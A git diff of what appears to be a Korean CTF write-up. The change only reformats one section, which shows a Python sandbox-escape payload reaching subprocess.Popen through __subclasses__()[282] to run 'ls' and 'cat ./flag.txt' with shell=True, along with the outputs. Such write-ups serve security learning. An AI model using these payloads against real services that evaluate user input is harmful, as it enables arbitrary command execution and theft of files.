@@ -269,13 +269,13 @@ PIPE 값은 소스코드를 보면 -1이다.
 
 <br>
 
-```''.__class__.__base__.__subclasses__()[282]('ls', shell=True, stdout=-1).communicate()```
-: ```(b'flag.txt\nmain.py\npoetry.lock\npyproject.toml\nREADME.md\n', None)```
+payload는 다음과 같다.
 
-<br>
++ ```''.__class__.__base__.__subclasses__()[282]('ls', shell=True, stdout=-1).communicate()```
+  + ```(b'flag.txt\nmain.py\npoetry.lock\npyproject.toml\nREADME.md\n', None)```
 
-```''.__class__.__base__.__subclasses__()[282]('cat ./flag.txt', shell=True, stdout=-1).communicate()```
-: ```(b'THIS_IS_FLAG', None)```
++ ```''.__class__.__base__.__subclasses__()[282]('cat ./flag.txt', shell=True, stdout=-1).communicate()```
+  + ```(b'THIS_IS_FLAG', None)```
 
 <br><br>
 <hr style="border: 2px solid;">
